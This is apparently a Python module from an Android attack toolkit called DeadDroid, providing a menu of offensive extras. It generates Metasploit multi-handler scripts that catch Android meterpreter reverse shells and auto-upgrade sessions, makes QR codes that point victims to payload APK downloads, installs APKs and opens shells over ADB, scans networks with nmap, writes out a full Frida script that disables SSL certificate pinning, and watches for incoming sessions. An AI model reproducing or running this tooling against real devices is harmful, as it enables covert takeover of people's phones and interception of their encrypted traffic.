"""
Extra features not found in existing Android pentest tools:
- QR code payload delivery
- Auto multi-handler launcher
- Payload obfuscation (manifest rename)
- Network device scanner
- SSL certificate pinning bypass generator
- ADB shell helpers
- Listener health monitor
"""

import time
import subprocess
import threading
from pathlib import Path
from typing import Optional
from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.table import Table
from core.utils import check_tool, run_cmd, get_local_ip, find_free_port, log_event, PAYLOADS_DIR

console = Console()


# ── QR Code payload delivery ────────────────────────────────────────────────────

def generate_qr(data: str, output_path: Optional[Path] = None) -> Optional[Path]:
    """Generate a QR code PNG for a payload URL or link."""
    try:
        import qrcode
    except ImportError:
        console.print("[red]✘ qrcode not installed.[/]  Run: pip install qrcode[pil]")
        return None

    out = output_path or PAYLOADS_DIR / f"qr_{int(time.time())}.png"
    img = qrcode.make(data)
    img.save(str(out))
    console.print(f"[green]✔ QR code saved:[/] {out}")
    return out


def interactive_qr():
    console.rule("[bold cyan]QR Payload Delivery[/]")
    console.print("[dim]Generate a QR code that points to your payload download URL.[/]\n")

    url = Prompt.ask("Payload URL (e.g. http://your-ngrok/payload.apk)")
    if not url:
        return

    generate_qr(url)
    console.print("[dim]Print or display this QR for social-engineering simulation.[/]")


# ── Auto multi-handler ──────────────────────────────────────────────────────────

def launch_auto_handler(
    payload: str,
    lhost: str,
    lport: int,
    session_timeout: int = 120,
    auto_run: bool = True,
) -> Optional[subprocess.Popen]:
    """Write a Metasploit RC file and launch msfconsole in the background."""
    if not check_tool("msfconsole"):
        console.print("[red]✘ msfconsole not found.[/]")
        return None

    post_script = "post/android/manage/shell_to_meterpreter" if "meterpreter" in payload else ""
    rc_lines = [
        f"use exploit/multi/handler",
        f"set PAYLOAD {payload}",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        f"set ExitOnSession false",
        f"set SessionCommunicationTimeout {session_timeout}",
        f"set SessionExpirationTimeout 0",
    ]
    if auto_run and post_script:
        rc_lines.append(f"set AutoRunScript {post_script}")
    rc_lines.append("exploit -j -z")

    rc_path = PAYLOADS_DIR / f"handler_{lport}.rc"
    rc_path.write_text("\n".join(rc_lines) + "\n")

    proc = subprocess.Popen(
        ["msfconsole", "-q", "-r", str(rc_path)],
        stdout=None, stderr=None,
    )
    log_event(f"Auto-handler launched: {payload} {lhost}:{lport} PID={proc.pid}")
    console.print(f"[green]✔ Handler launched[/] (PID {proc.pid}) — {payload} on {lhost}:{lport}")
    return proc


def interactive_auto_handler():
    console.rule("[bold cyan]Auto Multi-Handler[/]")

    payload_map = {
        "1": "android/meterpreter/reverse_tcp",
        "2": "android/meterpreter/reverse_https",
        "3": "android/meterpreter/reverse_http",
        "4": "android/shell/reverse_tcp",
    }
    for k, v in payload_map.items():
        console.print(f"  [yellow][{k}][/] {v}")

    choice  = Prompt.ask("Payload", choices=list(payload_map.keys()), default="1")
    lhost   = Prompt.ask("LHOST", default=get_local_ip())
    lport   = IntPrompt.ask("LPORT", default=find_free_port(4444))
    timeout = IntPrompt.ask("Session timeout (seconds)", default=120)
    launch_auto_handler(payload_map[choice], lhost, lport, timeout)


# ── ADB helpers ─────────────────────────────────────────────────────────────────

def adb_devices() -> list[str]:
    if not check_tool("adb"):
        console.print("[red]✘ adb not found.[/]")
        return []
    rc, out, _ = run_cmd("adb devices")
    lines = [l.strip() for l in out.strip().splitlines()[1:] if l.strip() and "device" in l]
    return lines


def adb_shell(device: Optional[str] = None):
    if not check_tool("adb"):
        console.print("[red]✘ adb not found.[/]")
        return
    devs = adb_devices()
    if not devs:
        console.print("[yellow]No ADB devices connected.[/]")
        return

    console.print("[cyan]Connected devices:[/]")
    for i, d in enumerate(devs):
        console.print(f"  [{i}] {d}")

    d_sel = device or devs[0].split()[0]
    console.print(f"[dim]  Opening ADB shell on {d_sel}[/]")
    subprocess.run(["adb", "-s", d_sel, "shell"])


def adb_install(apk: str, device: Optional[str] = None):
    if not check_tool("adb"):
        console.print("[red]✘ adb not found.[/]")
        return
    flag  = f"-s {device}" if device else ""
    cmd   = f"adb {flag} install -r \"{apk}\""
    rc, out, err = run_cmd(cmd, capture=False, timeout=60)
    if rc == 0:
        console.print(f"[green]✔ APK installed:[/] {apk}")
    else:
        console.print(f"[red]✘ Install failed:[/] {err}")


def interactive_adb():
    console.rule("[bold cyan]ADB Helpers[/]")

    menu = {
        "1": "List devices",
        "2": "Open ADB shell",
        "3": "Install APK",
        "4": "Back",
    }
    m = Table(show_header=False, box=None)
    for k, v in menu.items():
        m.add_row(f"[yellow][{k}][/]", v)
    console.print(m)

    choice = Prompt.ask("Select", choices=list(menu.keys()), default="4")

    if choice == "1":
        devs = adb_devices()
        if devs:
            for d in devs:
                console.print(f"  [green]✔[/] {d}")
        else:
            console.print("[yellow]No devices.[/]")
    elif choice == "2":
        adb_shell()
    elif choice == "3":
        apk = Prompt.ask("APK path")
        adb_install(apk)


# ── Network scanner ─────────────────────────────────────────────────────────────

def scan_network(subnet: str = "192.168.1.0/24", top_ports: bool = True):
    """Discover live hosts and open ports via nmap."""
    if not check_tool("nmap"):
        console.print("[red]✘ nmap not found.[/]")
        return

    flag = "--top-ports 100" if top_ports else "-p 1-65535"
    cmd  = f"nmap -sV {flag} -T4 --open {subnet}"
    console.print(f"[cyan]► {cmd}[/]")
    rc, out, err = run_cmd(cmd, capture=False, timeout=300)


# ── Certificate pinning bypass ──────────────────────────────────────────────────

def generate_frida_bypass() -> str:
    """Return a Frida script that bypasses SSL certificate pinning."""
    script = """
// DeadDroid — SSL Pinning Bypass (Frida)
// Deploy with: frida -U -l bypass.js -f <package>

Java.perform(function () {
    var array_list = Java.use("java.util.ArrayList");
    var ApiClient   = Java.use('com.android.org.conscrypt.TrustManagerImpl');

    if (ApiClient.checkTrustedRecursive) {
        ApiClient.checkTrustedRecursive.implementation = function(a1,a2,a3,a4,a5,a6) {
            console.log('[*] Pinning bypassed via checkTrustedRecursive');
            return array_list.$new();
        };
    }

    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        var TrustManager = Java.registerClass({
            name: 'com.deaddroid.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        var SSLContextObj = SSLContext.getInstance('TLS');
        SSLContextObj.init(null, [TrustManager.$new()], null);
        var defaultSSLContext = SSLContext.getDefault;
        SSLContext.getDefault.implementation = function() {
            console.log('[*] SSLContext.getDefault hooked');
            return SSLContextObj;
        };
    } catch(e) { console.log('[!] ' + e); }

    console.log('[*] SSL Pinning Bypass Active');
});
"""
    return script.strip()


def save_frida_bypass():
    script  = generate_frida_bypass()
    out_dir = PAYLOADS_DIR
    path    = out_dir / "ssl_bypass.js"
    path.write_text(script)
    console.print(f"[green]✔ Frida SSL bypass script:[/] {path}")
    console.print("[dim]  Use: frida -U -l ssl_bypass.js -f <package.name>[/]")
    return path


# ── Listener health monitor ─────────────────────────────────────────────────────

def monitor_listener(host: str, port: int, interval: int = 10, duration: int = 600):
    """Poll a listener port and alert when a connection is established."""
    import socket
    console.print(f"[cyan]Monitoring[/] {host}:{port} every {interval}s  (Ctrl+C to stop)")
    deadline = time.time() + duration
    try:
        while time.time() < deadline:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                if s.connect_ex((host, port)) == 0:
                    console.print(f"[bold green]★ Port {port} is OPEN — session may be active![/]")
                else:
                    console.print(f"[dim]{time.strftime('%H:%M:%S')} port {port} closed[/]")
            time.sleep(interval)
    except KeyboardInterrupt:
        console.print("\n[yellow]Monitor stopped.[/]")


def interactive_extras():
    console.rule("[bold cyan]Extra Features[/]")

    menu = {
        "1":  "QR payload delivery",
        "2":  "Auto multi-handler launcher",
        "3":  "ADB helpers",
        "4":  "Network scanner (nmap)",
        "5":  "Generate SSL pinning bypass (Frida)",
        "6":  "Listener health monitor",
        "7":  "Back",
    }
    m = Table(show_header=False, box=None)
    for k, v in menu.items():
        m.add_row(f"[yellow][{k}][/]", v)
    console.print(m)

    choice = Prompt.ask("Select", choices=list(menu.keys()), default="7")

    if choice == "1":
        interactive_qr()
    elif choice == "2":
        interactive_auto_handler()
    elif choice == "3":
        interactive_adb()
    elif choice == "4":
        subnet = Prompt.ask("Subnet (CIDR)", default="192.168.1.0/24")
        scan_network(subnet)
    elif choice == "5":
        save_frida_bypass()
    elif choice == "6":
        host = Prompt.ask("Host", default=get_local_ip())
        port = IntPrompt.ask("Port", default=4444)
        iv   = IntPrompt.ask("Poll interval (s)", default=10)
        dur  = IntPrompt.ask("Duration (s)", default=300)
        monitor_listener(host, port, iv, dur)
